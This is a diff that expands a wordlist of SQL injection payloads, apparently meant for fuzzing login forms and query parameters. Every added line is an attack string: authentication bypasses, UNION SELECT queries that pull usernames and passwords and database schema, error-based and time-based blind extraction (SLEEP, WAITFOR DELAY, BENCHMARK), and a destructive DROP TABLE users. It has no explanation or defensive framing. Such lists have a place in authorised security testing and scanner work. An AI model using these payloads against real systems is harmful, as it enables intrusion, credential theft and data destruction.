@@ -1,10 +1,124 @@
+'or 1=1
+'or 1=1--
+'or 1=1/*
 'or 1=1##
+admin' --
+admin' ##
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'/*
+admin' or 1=1
+admin' or 1=1--
+admin' or 1=1/*
+admin') or ('1'='1
 admin') or ('1'='1'--
 admin') or ('1'='1'##
 admin') or ('1'='1'/*
-admin') or ('1'='1
-'or 1=1/*
-admin'/*
-'or 1=1
-'or 1=1--
-admin' --
+admin') or '1'='1
+admin') or '1'='1'--
+admin') or '1'='1'##
+admin') or '1'='1'/*
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+admin" --
+admin" ##
+admin"/*
+admin" or "1"="1
+admin" or "1"="1"--
+admin" or "1"="1"##
+admin" or "1"="1"/*
+admin"or 1=1 or ""="
+admin" or 1=1
+admin" or 1=1--
+admin" or 1=1##
+admin" or 1=1/*
+admin") or ("1"="1
+admin") or ("1"="1"--
+admin") or ("1"="1"##
+admin") or ("1"="1"/*
+admin") or "1"="1
+admin") or "1"="1"--
+admin") or "1"="1"##
+admin") or "1"="1"/*
+1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+" OR "1"="1
+OR 1=1
+'; DROP TABLE users; --
+admin'--
+' OR '1'='1' --
+' OR 1=1 --
+' OR 1=1/*
+' OR 'x'='x'
+'' OR ''=''
+'='
+' LIKE '%'
+' UNION SELECT NULL, NULL--
+' UNION SELECT NULL, NULL, NULL--
+' UNION SELECT username, password FROM users--
+' UNION SELECT ALL FROM users--
+' UNION SELECT 1, 'database' FROM information_schema.tables--
+' UNION SELECT table_name, column_name FROM information_schema.columns--
+' UNION SELECT @@version, NULL--
+' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT 1, database()--
+' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name='users'--
+'; SELECT 1/0--
+' AND 1=CONVERT(int, (SELECT @@version))--
+'; SELECT user, password FROM mysql.user WHERE 1=1--
+' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT @@version), FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND 1=CAST((CHR(113)||CHR(107)||CHR(98)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (1=1) THEN CHR(49) ELSE CHR(48) END))||CHR(113)||CHR(106)||CHR(107)||CHR(120)||CHR(113)) AS NUMERIC)--
+' AND 1=UTL_INADDR.get_host_name((SELECT user FROM dual))--
+' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT user())))--
+' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1), FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x ...
+' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1), FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+1' AND 1=1--
+1' AND 1=2--
+/*
+'; WAITFOR DELAY '0:0:5'--
+' AND 1=(SELECT COUNT(*) FROM tablenames);--
+' AND 1=(SELECT TOP 1 CAST(table_name AS int) FROM information_schema.tables)--
+' OR 1=(SELECT TOP 1 1 FROM information_schema.tables)--
+' OR EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name='users')--
+' AND ascii(substring((SELECT @@version), 1, 1)) > 51 --
+' AND LENGTH(USER()) > 1--
+'+OR+NOT+DELAY+0:0:15
+';WAITFOR DELAY '0:0:15'--
+';WAITFOR DELAY '0:0:15'--
+' AND CHAR(124)+USER()+CHAR(124)--
+') AND '1'='1
+') AND ('1'='1
+' OR ''=''
+' OR 1=1 --
+1 AND (SELECT COUNT(*) FROM tablename) > 0 --
+1' AND SLEEP(5)--
+1' AND IF(ASCII(SUBSTRING((SELECT user()), 1, 1)) = 114, SLEEP(5), 0)--
+1' AND BENCHMARK(5000000,MD5(1))--
+1' AND IF(1=1,BENCHMARK(10000000,MD5(1)),0)--
+1' AND IF(1=2,BENCHMARK(10000000,MD5(1)),0)--
+1' AND IF((SELECT * FROM (SELECT(SLEEP(20)))a)--
+1' OR pg_sleep(5)--
+'; PG_SLEEP(5)--
+' AND '1'='1
+1 OR 1=1
+1; WAITFOR DELAY '0:0:5'--
+1' AND '1'='1
+1' AND '1'='1'--
+' OR 1=1--
+' OR '1'='1'/*
+1' OR '1'='1'/*
+1' OR '1'='1'--
+1' OR 'x'='x'--
+' OR '1'='1' --
+' OR 'x'='x'--
+' OR 1=1 --
+'; DROP TABLE users; --
+' AND 1=1--
+' AND 1=0--
+' AND 'a'='a
+' AND 'a'='b
+1' AND 'a'='a
+1' AND 'a'='b
+1' OR 'a'='a
+1' OR 'a'='b
+1' OR 'a'='c
